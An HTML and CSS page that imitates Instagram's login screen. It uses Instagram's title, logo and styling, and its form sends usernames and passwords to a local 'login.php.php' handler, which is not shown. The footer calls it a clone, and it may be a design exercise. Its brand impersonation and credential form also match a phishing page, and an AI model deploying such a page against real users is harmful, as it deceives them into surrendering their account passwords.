<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fafafa;
      font-family: Arial, sans-serif;
    }
    .container {
      width: 350px;
      margin: 50px auto;
      padding: 40px;
      background: #fff;
      border: 1px solid #dbdbdb;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo img {
      width: 175px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 5px 0 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #3897f0;
      border: none;
      color: #fff;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #318ce7;
    }
    .or-separator {
      display: flex;
      align-items: center;
      text-align: center;
      color: #8e8e8e;
      margin: 15px 0;
    }
    .or-separator::before, .or-separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .or-separator::before {
      margin-right: 10px;
    }
    .or-separator::after {
      margin-left: 10px;
    }
    .facebook-login {
      color: #385185;
      font-weight: bold;
      text-align: center;
      margin: 10px 0;
      cursor: pointer;
    }
    .forgot-password {
      text-align: center;
      margin-top: 10px;
      font-size: 12px;
      color: #00376b;
      cursor: pointer;
    }
    .signup-link {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }
    .signup-link a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }
    .footer {
      margin-top: 25px;
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="instagram_logo.png" alt="Instagram Logo" width="100">
    </div>
    <form action="login.php.php" method="POST">
      <input type="text" name="username" placeholder="Phone number, username or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or-separator">OR</div>

    <div class="facebook-login">Log in with Facebook</div>

    <div class="forgot-password">Forgot password?</div>

    <div class="signup-link">
      Don't have an account? <a href="#">Sign up</a><br>
      <a href="#">New user?</a>
    </div>

    <div class="footer">
      Â© 2025 Instagram Clone
    </div>
  </div>

</body>
</html>
